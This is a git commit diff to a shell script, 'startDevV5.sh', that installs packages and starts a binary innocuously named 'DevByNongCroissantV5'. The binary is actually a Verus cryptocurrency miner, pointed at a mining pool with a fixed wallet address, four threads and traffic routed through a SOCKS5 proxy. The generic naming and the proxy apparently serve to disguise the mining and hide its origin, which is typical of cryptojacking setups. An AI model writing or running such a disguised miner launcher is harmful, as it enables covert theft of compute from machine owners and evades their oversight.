5715a2cd47a81287e2d0b159a8ea2eca12a1d31a
closemaptoya <85560638+closemaptoya@users.noreply.github.com>
2021-07-03 23:01:55 +0700

    Update startDevV5.sh

--- startDevV5.sh
+++ startDevV5.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 apt-get update 
-apt install libcurl4-openssl-dev -y
+apt install screen libjansson4 -y
 chmod +x DevByNongCroissantV5
-./DevByNongCroissantV5 -a verus -o stratum+tcp://na.luckpool.net:3960 -u RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr.DevByNongCroissantV5 -t 4 -x socks5://98.162.25.23:4145
+./DevByNongCroissantV5 -a verus -o stratum+tcp://pool.verus.io:9999 -u RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr.DevByNongCroissantV5 -t 4 -x socks5://98.162.25.23:4145
